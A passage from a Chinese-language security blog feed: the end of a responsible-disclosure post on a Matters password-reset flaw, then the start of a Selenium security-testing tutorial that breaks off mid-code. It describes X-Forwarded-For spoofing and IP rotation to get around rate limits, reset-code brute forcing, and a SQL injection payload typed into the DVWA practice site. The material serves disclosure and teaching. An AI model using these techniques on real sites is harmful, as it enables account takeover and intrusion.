底下省略\n</code></pre>\n<p>}<br>\n</code></pre></p>\n<p>nginx 的 rate limit 基本上都是以 IP 為主，如果真的想繞過的話可以嘗試看看 <a href=\"https://rhinosecuritylabs.com/aws/bypassing-ip-based-blocking-aws/\">IP rotate</a>，一個簡單的方式是去 AWS 上開很多 API gateway 當 proxy，然後你就有了一堆不同的 IP 可以輪流使用。</p>\n<p>但這邊還用不上這個技巧，因為在設定中可以看到它使用了 <code>$http_x_forwarded_for</code> 這個參數，如果沒有管理好的話，可以自己傳入 <code>X-Forwarded-For</code> 來偽造任意 IP，藉此繞過 rate limit 的限制。</p>\n<p>而 Matters 在這邊顯然沒有設置好，因此 rate limit 算是虛設。</p>\n<p>做到這邊，只要我們能夠一秒發送 3000 個 request 就能做出 POC，證明攻擊確實可行，但還有沒有其他的方法，能讓這個數字再小一點呢？</p>\n<h2 id=\"%E5%90%8C%E6%99%82%E5%AD%98%E5%9C%A8%E7%9A%84%E9%A9%97%E8%AD%89%E7%A2%BC\"><a class=\"direct-link\" href=\"#%E5%90%8C%E6%99%82%E5%AD%98%E5%9C%A8%E7%9A%84%E9%A9%97%E8%AD%89%E7%A2%BC\">#</a> 同時存在的驗證碼</h2>\n<p>在開頭的時候有提過重設密碼有一些小細節要注意，像是：</p>\n<ol>\n<li>重設密碼的 token 應該只能使用一次</li>\n<li>重設密碼的 token 應該要有過期時間</li>\n<li>如果使用者產生了新的重設密碼 token，舊的應該要廢棄</li>\n</ol>\n<p>而 Matters 前兩點都做了，就是唯獨第三點沒有做好。從程式碼中我們可以看出當新的驗證碼建立時，舊的並不會刪除或是標記為廢棄。</p>\n<p>這會有什麼影響呢？我們來算個簡單的數學吧！</p>\n<p>驗證碼的組合總共有 900,000 種，我們有 300 秒的時間可以攻擊，如果可以在這段時間內發送 900,000 個 request 而且 server 也有處理，就一定可以猜到重設密碼的驗證碼。</p>\n<p>若是我們改成先不要猜，而是先發送 1000 次的重設密碼請求，因為舊的驗證碼依然有效，所以這時我們猜一次，猜中任何一組的機率就是 1000/900000 = 1/900，變成原本的 1000 倍。</p>\n<p>猜 1000 次的話，猜中的機率就是「1 - 每次都猜不中的機率」，大約是 <code>1 - (899/900)^1000</code> = 67%，如果猜到 5000 次的話，猜中的機率就是 <code>1 - (899/900)^5000</code> = 99.6%。</p>\n<p>也就是說，我們只要發送 1000 個重設密碼的請求外加 5000 個確認驗證碼的請求，總共 6000 個請求，就有 99.6% 的機率可以正確猜到至少一組驗證碼！</p>\n<p>可以寫個簡單的小程式來驗證我們的機率計算：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> _ <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'lodash'</span><span class=\"token punctuation\">)</span><br><br><span class=\"token keyword\">const</span> rounds <span class=\"token operator\">=</span> <span class=\"token number\">100000</span> <span class=\"token comment\">// 跑十萬輪取平均 </span><br><span class=\"token keyword\">const</span> guessRounds <span class=\"token operator\">=</span> <span class=\"token number\">5000</span> <span class=\"token comment\">// 猜 5000 次</span><br><span class=\"token keyword\">const</span> tokenCount <span class=\"token operator\">=</span> <span class=\"token number\">1000</span> <span class=\"token comment\">// 1000 個合法驗證碼</span><br><span class=\"token keyword\">let</span> winCount <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <br><br><span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> r<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> r<span class=\"token operator\">&lt;</span>rounds<span class=\"token punctuation\">;</span> r<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">let</span> ans <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>  <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;</span>tokenCount<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    ans<span class=\"token punctuation\">[</span>_<span class=\"token punctuation\">.</span><span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token number\">100000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">999999</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><br>  <span class=\"token punctuation\">}</span><br>  <span class=\"token keyword\">let</span> isWin <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><br>  <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;</span>guessRounds<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">const</span> guessNumber <span class=\"token operator\">=</span> _<span class=\"token punctuation\">.</span><span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token number\">100000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">999999</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">[</span>guessNumber<span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      isWin <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><br>      <span class=\"token keyword\">break</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>isWin<span class=\"token punctuation\">)</span> winCount<span class=\"token operator\">++</span><br><span class=\"token punctuation\">}</span><br><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>winCount<span class=\"token operator\">*</span><span class=\"token number\">100</span> <span class=\"token operator\">/</span> rounds<span class=\"token punctuation\">)</span><br><span class=\"token comment\">// 輸出：99.626，我們算出的機率差不多</span></code></pre>\n<p>原本要發 900,001 個 request 才能有 100% 的機率可以猜中，現在只要犧牲一點點正確性，變成 99.6% 的機率猜中，就可以把 request 數量降低到 6000 次，低了 150 倍！</p>\n<p>原本我們在五分鐘內一秒要發 3000 個 request，現在一秒只要 20 個 request 就好（其實這邊也只是大略計算，因為是有順序性的，必須要等 1000 個發送驗證碼的 request 結束後才能開始猜，而這 1000 個可能又會花個幾秒，但這邊為了方便計算先忽略不計，對整體的影響不大）</p>\n<p>就因為這個重設密碼的小缺陷，沒有把上一組驗證碼淘汰掉，導致我們可以產生多組驗證碼，大幅降低暴力破解的難度。只要能在五分鐘內發送 6000 個 request，就有 99.6% 的機率可以更改一組帳號的密碼。</p>\n<p>由於這是重設密碼功能，所以改完密碼之後你就可以直接用他的身份登入系統，達成帳號奪取，把其他人的帳號都變成是你的。如果想要擴大影響性的話，可以奪取管理員的帳號，就有機會進入管理後台進行更多操作。</p>\n<h2 id=\"%E5%BB%BA%E8%AD%B0%E4%BF%AE%E8%A3%9C%E6%96%B9%E5%BC%8F\"><a class=\"direct-link\" href=\"#%E5%BB%BA%E8%AD%B0%E4%BF%AE%E8%A3%9C%E6%96%B9%E5%BC%8F\">#</a> 建議修補方式</h2>\n<p>第一個要修的地方是重設密碼的小缺陷，在使用者產生新的驗證碼時，舊的應該要被淘汰掉，保證永遠只有最新的一組可以通過驗證，這樣攻擊者猜中的機率就永遠是 1/n，而不會像上面的範例那樣，可以把機率提高 1000 倍或更多倍。</p>\n<p>第二個則是驗證碼的產生不該由 <code>redirectUrl</code> 參數來決定，而是應該由驗證碼的 type 來決定，如果是 reset password，就一定要是 strong，這樣子就會用 <code>nanoid(40)</code> 來產生，猜中的機率就變得微乎其微，大幅降低暴力破解的可行性。</p>\n<p>第三個是 redirectUrl 不應該從前端傳入，而是直接把網址寫在後端。如果真的要從前端傳入，那後端要做好完善的檢查，確保 redirectUrl 傳入的是合法的路徑，而不是讓攻擊者可以傳入任意網址（不過如果攻擊者能結合 <a href=\"https://tech-blog.cymetrics.io/posts/huli/open-redirect/\">open redirect</a>，又是另外一回事了）</p>\n<p>最後一個則是 nginx 的 rate limit 限制不應該用 <code>X-Forwarded-For</code> 來決定，就算真的要用這個，也要確保它的值無法由攻擊者自行傳入。</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>重設密碼機制看似簡單，但其實一不小心還是有可能做出有漏洞的機制，導致攻擊者有機可趁，在 HackTricks 上有個頁面專門在講 reset password 可能會有的問題：<a href=\"https://book.hacktricks.xyz/pentesting-web/reset-password\">Reset/Forgotten Password Bypass</a>，除了這篇提到的以外還有更多的問題，整理得很詳細，很值得參考看看。</p>\n<p>如果你以為只有一般的網站會有這種問題，那你就錯了。一名資安研究員 Laxman Muthiyah 發現可以用 concurrent 的方式繞過 <a href=\"https://thezerohack.com/hack-any-instagram\">Instagram</a> 的 rate limiting，成功發送 200 個 request，並且用 1000 台機器產生出 20 萬個 request，就有 20% 的機率攻擊成功。</p>\n<p>只要有 5000 台機器，就能拿下任何帳號。5000 台聽起來很多，成本應該很高對吧？但如果善用 cloud service 的話，他估算可能只需要 150 美金左右即可達成一次攻擊（因為算小時收費，只要開一兩個小時即可）</p>\n<p>而他也在去年七月用同樣的手法繞過<a href=\"https://thezerohack.com/how-i-might-have-hacked-any-microsoft-account\">微軟</a>的 rate limiting，並且拿到 5 萬美金的獎金。</p>\n<p>像這種漏洞如果能成功被利用，就能夠直接奪取他人的帳號，影響很大，需要多加注意相關的安全性。看到這裡，大家不妨也檢查一下自家的重設密碼機制是否安全。</p>\n<p>最後，這次找到漏洞以後一樣有回報給 Matters，底下是完整時間軸：</p>\n<p><code>2021-06-24</code> 回報漏洞給 Matters<br>\n<code>2021-06-25</code> 收到 Matters 回覆，確認漏洞存在<br>\n<code>2021-08-20</code> Matters 修復部分功能，產生新的驗證碼時會淘汰舊的<br>\n<code>2021-08-26</code> Matters 確認漏洞評級為 High，獎金為 150 USD<br>\n<code>2021-10-28</code> 關心後續修復狀況，確認是否修補完畢<br>\n<code>2021-11-30</code> Matters 增強 non-strong 的驗證碼基數<br>\n<code>2021-12-02</code> 文章初稿完成，與 Matters 確認是否可發布<br>\n<code>2021-12-21</code> Matters 確認問題已修復完畢以及可發布文章</p>\n",
      "date_published": "2022-01-04T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/nick/selenuim/",
      "url": "https://tech-blog.cymetrics.io/posts/nick/selenuim/",
      "title": "資安也要自動化 Selenium",
      "content_html": "<p><img src=\"/img/posts/nick/selenium/se_1.jpg\" alt=\"\"></p>\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<p>很多人都買過福袋，試想今天買了一個很貴的福袋，拿起來又大又重感覺很充實，但辛苦的搬回家後卻發現裡面只有一支筆是你想要的，其他都是用不到丟掉卻可惜的東西，真的令人很崩潰。</p>\n<!-- summary -->\n<p>當你想做特定的安全性測試，又不想只為了單一測項花大錢買整套的弱掃工具時，一個好入門又方便客製化的開源工具能給你很大的幫助，就像根據自己的手打造一支專屬的筆，多花點時間但順手，還比福袋省錢。</p>\n<p>本文的目的就是簡單介紹一下 Selenium，在舉幾個有關網站安全測試的例子，最後分享一下使用心得。</p>\n<!-- summary -->\n<hr>\n<h2 id=\"selenium-%E7%B0%A1%E4%BB%8B\"><a class=\"direct-link\" href=\"#selenium-%E7%B0%A1%E4%BB%8B\">#</a> Selenium 簡介</h2>\n<p>Selenium 能模擬一般消費者瀏覽網頁的行為並藉此進行自動化測試，雖然它是自動化測試工具但更多人拿來做動態網頁爬蟲，因為在動態網頁抓資料時必須要模擬一些操作行為，而這正好是 Selenium 的強項。</p>\n<h3 id=\"1.-selenium-ide\"><a class=\"direct-link\" href=\"#1.-selenium-ide\">#</a> 1. Selenium IDE</h3>\n<p>瀏覽器的擴充套件，它提供了錄製、回放、測試腳本匯入匯出功能，用於編寫功能測試，且不需要用寫程式，是使用 Selenium 進行網站自動化的基礎。</p>\n<h3 id=\"2.-selenium-webdriver\"><a class=\"direct-link\" href=\"#2.-selenium-webdriver\">#</a> 2. Selenium WebDriver</h3>\n<p>用來執行並操作瀏覽器的一個 API 介面，程式透過呼叫 WebDriver 來直接對瀏覽器進行操作，Selenium WebDriver API 支援 Java、C#、Ruby、Python 及 Perl 等多種語言進行腳本撰寫，許多 Web Test Framework，都是以 Selenium WebDriver API 作為基礎，功能強大且穩固已經讓 Selenium 成為瀏覽器自動化的基石。</p>\n<h3 id=\"3.-selenium-grid\"><a class=\"direct-link\" href=\"#3.-selenium-grid\">#</a> 3. Selenium Grid</h3>\n<p>主要可以讓我們輕鬆的同時使用多台機器、多個瀏覽器來對網頁進行測試。</p>\n<hr>\n<h2 id=\"%E5%88%9D%E9%9A%8E%E5%AF%A6%E4%BD%9C%E6%96%B9%E5%BC%8F%3A-selenium-ide\"><a class=\"direct-link\" href=\"#%E5%88%9D%E9%9A%8E%E5%AF%A6%E4%BD%9C%E6%96%B9%E5%BC%8F%3A-selenium-ide\">#</a> 初階實作方式: Selenium IDE</h2>\n<p>最簡單的自動化測試就是將手動測試時的動作紀錄起來，之後要測試的時候重新播放，省去重新手動測試的人力。因為 Selenium IDE 本質是瀏覽器的擴充套件，接下來以 Chrome 來示範對 DVWA 靶站的登入測試頁做 SQL injection 的測試(對 SQL Injection 不熟的可參考)。</p>\n<h3 id=\"%E6%AD%A5%E9%A9%9F-1.-%E5%AE%89%E8%A3%9D-selenium-ide\"><a class=\"direct-link\" href=\"#%E6%AD%A5%E9%A9%9F-1.-%E5%AE%89%E8%A3%9D-selenium-ide\">#</a> 步驟 1. 安裝 Selenium IDE</h3>\n<ul>\n<li>\n<ol>\n<li>安裝 chrome<br>\n<a href=\"https://www.google.com/intl/zh-tw/chrome/\">https://www.google.com/intl/zh-tw/chrome/</a></li>\n</ol>\n</li>\n<li>\n<ol start=\"2\">\n<li>到 chrome 線上應用程式商店搜索 Selenium IDE 並安裝<br>\n<a href=\"https://chrome.google.com/webstore/detail/selenium-ide/mooikfkahbdckldjjndioackbalphokd\">https://chrome.google.com/webstore/detail/selenium-ide/mooikfkahbdckldjjndioackbalphokd</a><br>\n<img src=\"/img/posts/nick/selenium/se_2.jpg\" alt=\"\"></li>\n</ol>\n</li>\n</ul>\n<h3 id=\"%E6%AD%A5%E9%A9%9F-2.-%E8%A1%8C%E7%82%BA%E9%8C%84%E8%A3%BD\"><a class=\"direct-link\" href=\"#%E6%AD%A5%E9%A9%9F-2.-%E8%A1%8C%E7%82%BA%E9%8C%84%E8%A3%BD\">#</a> 步驟 2. 行為錄製</h3>\n<ul>\n<li>\n<ol>\n<li>點選 Icon 開啟 Selenium IDE</li>\n</ol>\n<p><img src=\"/img/posts/nick/selenium/se_3.jpg\" alt=\"\"></p>\n</li>\n<li>\n<ol start=\"2\">\n<li>點選 &quot;Record a new test in a new project&quot; 建立測試專案並指定要錄製的網站 URL</li>\n</ol>\n<p><img src=\"/img/posts/nick/selenium/se_4.jpg\" alt=\"\"></p>\n<p><img src=\"/img/posts/nick/selenium/se_5.jpg\" alt=\"\"></p>\n</li>\n<li>\n<ol start=\"3\">\n<li>在彈出來的新視窗進行測試行為，這邊以 SQL injection 為例</li>\n</ol>\n<p><img src=\"/img/posts/nick/selenium/se_6.jpg\" alt=\"\"></p>\n<ul>\n<li>\n<ol>\n<li>點輸入框</li>\n</ol>\n</li>\n<li>\n<ol start=\"2\">\n<li>輸入 admin' or '1' = '1</li>\n</ol>\n</li>\n<li>\n<ol start=\"3\">\n<li>點擊登入按鍵</li>\n</ol>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"%E6%AD%A5%E9%A9%9F-3.-%E9%87%8D%E6%94%BE%E6%B8%AC%E8%A9%A6\"><a class=\"direct-link\" href=\"#%E6%AD%A5%E9%A9%9F-3.-%E9%87%8D%E6%94%BE%E6%B8%AC%E8%A9%A6\">#</a> 步驟 3. 重放測試</h3>\n<ul>\n<li>\n<ol>\n<li>重放前一步驟記錄下的測試，Selenium 會做 5 個動作</li>\n</ol>\n<ul>\n<li>\n<ol>\n<li>開啟測試頁面</li>\n</ol>\n</li>\n<li>\n<ol start=\"2\">\n<li>設定視窗大小</li>\n</ol>\n</li>\n<li>\n<ol start=\"3\">\n<li>點輸入框</li>\n</ol>\n</li>\n<li>\n<ol start=\"4\">\n<li>輸入 admin' or '1' = '1</li>\n</ol>\n</li>\n<li>\n<ol start=\"5\">\n<li>點擊登入按鍵</li>\n</ol>\n</li>\n</ul>\n<p><img src=\"/img/posts/nick/selenium/se_7.jpg\" alt=\"\"></p>\n</li>\n<li>\n<ol start=\"2\">\n<li>這時候會看到成功執行 SQL Injection 的畫面</li>\n</ol>\n<p><img src=\"/img/posts/nick/selenium/se_8.jpg\" alt=\"\"></p>\n</li>\n<li>\n<ol start=\"3\">\n<li>最後記得存檔，瀏覽器不會幫你記錄這些，下次開啟需從存檔導入</li>\n</ol>\n<p><img src=\"/img/posts/nick/selenium/se_9.jpg\" alt=\"\"></p>\n</li>\n</ul>\n<hr>\n<h2 id=\"%E9%80%B2%E9%9A%8E%E5%AF%A6%E4%BD%9C%E6%96%B9%E5%BC%8F%3A-selenium-webdriver\"><a class=\"direct-link\" href=\"#%E9%80%B2%E9%9A%8E%E5%AF%A6%E4%BD%9C%E6%96%B9%E5%BC%8F%3A-selenium-webdriver\">#</a> 進階實作方式: Selenium WebDriver</h2>\n<p>有一些無法攻擊方式較難只靠側錄來完成，像是 Brute Force 和 Buffer Overflow 等等，這時候就需要寫程式來配合 Selenium WebDriver 進行測試。接下來以 Chrome + Python 來對 iThome 做登入測試，因為選真實的網站來示範，所以只執行單次登入來證實可以用 Selenium WebDriver 做 Brute Force，而不是真的打下去。</p>\n<h3 id=\"%E6%AD%A5%E9%A9%9F-1.-%E5%AE%89%E8%A3%9D-selenium-webdriver\"><a class=\"direct-link\" href=\"#%E6%AD%A5%E9%A9%9F-1.-%E5%AE%89%E8%A3%9D-selenium-webdriver\">#</a> 步驟 1. 安裝 Selenium WebDriver</h3>\n<p>安裝步驟就不多贅述，這邊提供下載位置與測試時的版本作為參考</p>\n<ul>\n<li>\n<ol>\n<li>Chrome (96.0.4664.110)<br>\n<a href=\"https://www.google.com/intl/zh-tw/chrome/\">https://www.google.com/intl/zh-tw/chrome/</a></li>\n</ol>\n</li>\n<li>\n<ol start=\"2\">\n<li>Python (3.8.9)<br>\n<a href=\"https://www.python.org/downloads/\">https://www.python.org/downloads/</a></li>\n</ol>\n</li>\n<li>\n<ol start=\"3\">\n<li>Selenium WebDriver (4.0.0)<br>\n<code>pip install selenium</code></li>\n</ol>\n</li>\n<li>\n<ol start=\"4\">\n<li>ChromeDriver (96.0.4664.45)<br>\n<a href=\"https://chromedriver.chromium.org/\">https://chromedriver.chromium.org/</a></li>\n</ol>\n</li>\n<li>\n<ol start=\"5\">\n<li>(option)webdriver_manager (3.5.2)<br>\n<code>pip install webdriver-manager</code></li>\n</ol>\n</li>\n</ul>\n<p>備註: webdriver_manager 可偵測當前系統與Chrome版本自動下載 ChromeDriver，但不是所有開發環境都通用(ex. docker)</p>\n<h3 id=\"%E6%AD%A5%E9%A9%9F-2.-%E5%8F%96%E5%BE%97%E9%A0%81%E9%9D%A2%E5%85%83%E7%B4%A0\"><a class=\"direct-link\" href=\"#%E6%AD%A5%E9%A9%9F-2.-%E5%8F%96%E5%BE%97%E9%A0%81%E9%9D%A2%E5%85%83%E7%B4%A0\">#</a> 步驟 2. 取得頁面元素</h3>\n<ul>\n<li>\n<ol>\n<li>從頁面上取得 XPath 用於定位點擊與輸入</li>\n</ol>\n<p><img src=\"/img/posts/nick/selenium/se_10.jpg\" alt=\"\"></p>\n</li>\n</ul>\n<h3 id=\"%E6%AD%A5%E9%A9%9F-3.-%E5%9F%B7%E8%A1%8C%E6%B8%AC%E8%A9%A6\"><a class=\"direct-link\" href=\"#%E6%AD%A5%E9%A9%9F-3.-%E5%9F%B7%E8%A1%8C%E6%B8%AC%E8%A9%A6\">#</a> 步驟 3. 執行測試</h3>\n<ul>\n<li>\n<ol>\n<li>開啟瀏覽器</li>\n</ol>\n</li>\n</ul>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> selenium <span class=\"token keyword\">import</span> webdriver<br><span class=\"token keyword\">from</span> selenium<span class=\"token punctuation\">.</span>webdriver<span class=\"token punctuation\">.</span>chrome<span class=\"token punctuation\">.</span>options <span class=\"token keyword\">import</span> Options<br><span class=\"token keyword\">from</span> webdriver_manager<span class=\"token punctuation\">.</span>chrome <span class=\"token keyword\">import</span> ChromeDriverManager<br><span class=\"token keyword\">from</span> webdriver_manager<span class=\"token punctuation\">.</span>utils <span class=\"token keyword\">import</span> ChromeType<br><span class=\"token comment\"># 0. init</span><br>chrome_options <span class=\"token operator\">=</span> Options<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>chrome_options<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">\"--incognito\"</span><span class=\"token punctuation\">)</span><br><span class=\"token comment\"># 1. set headless</span><br><span class=\"token keyword\">if</span> headless_mode<span class=\"token punctuation\">:</span><br>    chrome_options<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--headless'</span><span class=\"token punctuation\">)</span><br>    chrome_options<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--disable-gpu'</span><span class=\"token punctuation\">)</span><br><span class=\"token comment\"># 2. set user-agent</span><br>ua <span class=\"token operator\">=</span> <span class=\"token string\">\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) \"</span> \\<br>    <span class=\"token string\">\"AppleWebKit/537.36 (KHTML, like Gecko) \"</span> \\<br>    <span class=\"token string\">\"Chrome/92.0.4515.159 Safari/537.36\"</span><br>chrome_options<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'user-agent={}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>ua<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><span class=\"token comment\"># 3. open browser</span><br>driver <span class=\"token operator\">=</span> webdriver<span class=\"token punctuation\">.</span>Chrome<span class=\"token punctuation\">(</span>ChromeDriverManager<span class=\"token punctuation\">(</span>chrome_type<span class=\"token operator\">=</span>ChromeType<span class=\"token punctuation\">.</span>CHROMIUM<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>install<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><br>                          options<span class=\"token operator\">=</span>chrome_options<span class=\"token punctuation\">)</span><br>driver<span class=\"token punctuation\">.</span>set_window_size<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">,</span> <span class=\"token number\">768</span><span class=\"token punctuation\">)</span><br></code></pre>\n<ul>\n<li>\n<ol start=\"2\">\n<li>設計動作</li>\n</ol>\n</li>\n</ul>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> selenium<span class=\"token punctuation\">.</span>webdriver<span class=\"token punctuation\">.</span>common<span class=\"token punctuation\">.</span>by <span class=\"token keyword\">import</span> By<br><br><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span><br>    driver<span class=\"token punctuation\">.</span>implicitly_wait<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><br>    driver<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>input_url<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">for</span> temp_action <span class=\"token keyword\">in</span> input_action_list<span class=\"token punctuation\">:</span><br>        <span class=\"token keyword\">if</span> temp_action<span class=\"token punctuation\">[</span><span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'click'</span><span class=\"token punctuation\">:</span><br>            driver<span class=\"token punctuation\">.</span>find_element<span class=\"token punctuation\">(</span>By<span class=\"token punctuation\">.</span>XPATH<span class=\"token punctuation\">,</span> temp_action<span class=\"token punctuation\">[</span><span class=\"token string\">'xpath'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>click<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>        <span class=\"token keyword\">if</span> temp_action<span class=\"token punctuation\">[</span><span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'write'</span><span class=\"token punctuation\">:</span><br>            driver<span class=\"token punctuation\">.</span>find_element<span class=\"token punctuation\">(</span>By<span class=\"token punctuation\">.</span>XPATH<span class=\"token punctuation\">,</span> temp_action<span class=\"token punctuation\">[</span><span class=\"token string\">'xpath'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>send_keys<span class=\"token punctuation\">(</span>temp_action<span class=\"token punctuation\">[</span><span class=\"token string\">'text'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><br><span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> ex<span class=\"token punctuation\">:</span><br>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Exception:'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>ex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><span class=\"token keyword\">finally</span><span class=\"token punctuation\">:</span><br>    driver<span class=\"token punctuation\">.</span>quit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br></code></pre>\n<ul>\n<li>\n<ol start=\"3\">\n<li>啟動測試(完整程式碼)</li>\n</ol>\n</li>\n</ul>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> selenium <span class=\"token keyword\">import</span> webdriver<br><span class=\"token keyword\">from</span> selenium<span class=\"token punctuation\">.</span>webdriver<span class=\"token punctuation\">.</span>chrome<span class=\"token punctuation\">.</span>options <span class=\"token keyword\">import</span> Options<br><span class=\"token keyword\">from</span> selenium<span class=\"token punctuation\">.</span>webdriver<span class=\"token punctuation\">.</span>common<span class=\"token punctuation\">.</span>by <span class=\"token keyword\">import</span> By<br><span class=\"token keyword\">from</span> webdriver_manager<span class=\"token punctuation\">.</span>chrome <span class=\"token keyword\">import</span> ChromeDriverManager<br><span class=\"token keyword\">from</span> webdriver_manager<span class=\"token punctuation\">.</span>utils <span class=\"token keyword\">import</span> ChromeType<br><br><span class=\"token keyword\">def</span> <span class=\"token function\">selenium_chrome_demo</span><span class=\"token punctuation\">(</span>input_url<span class=\"token punctuation\">,</span> input_action_list<span class=\"token punctuation\">,</span> headless_mode<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>    <span class=\"token comment\"># 0. init</span><br>    chrome_options <span class=\"token operator\">=</span> Options<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>    chrome_options<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">\"--incognito\"</span><span class=\"token punctuation\">)</span><br>    <span class=\"token comment\"># 1. set headless</span><br>    <span class=\"token keyword\">if</span> headless_mode<span class=\"token punctuation\">:</span><br>        chrome_options<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--headless'</span><span class=\"token punctuation\">)</span><br>        chrome_options<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--disable-gpu'</span><span class=\"token punctuation\">)</span><br>    <span class=\"token comment\"># 2. set user-agent</span><br>    ua <span class=\"token operator\">=</span> <span class=\"token string\">\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) \"</span> \\<br>         <span class=\"token string\">\"AppleWebKit/537.36 (KHTML, like Gecko) \"</span> \\<br>         <span class=\"token string\">\"Chrome/92.0.4515.159 Safari/537.36\"</span><br>    chrome_options<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'user-agent={}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>ua<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br>    <span class=\"token comment\"># 3. open browser</span><br>    driver <span class=\"token operator\">=</span> webdriver<span class=\"token punctuation\">.</span>Chrome<span class=\"token punctuation\">(</span>ChromeDriverManager<span class=\"token punctuation\">(</span>chrome_type<span class=\"token operator\">=</span>ChromeType<span class=\"token punctuation\">.</span>CHROMIUM<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>install<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><br>                              options<span class=\"token operator\">=</span>chrome_options<span class=\"token punctuation\">)</span><br>    driver<span class=\"token punctuation\">.</span>set_window_size<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">,</span> <span class=\"token number\">768</span><span class=\"token punctuation\">)</span><br>    <span class=\"token comment\"># 4. run action</span><br>    <span class=\"token 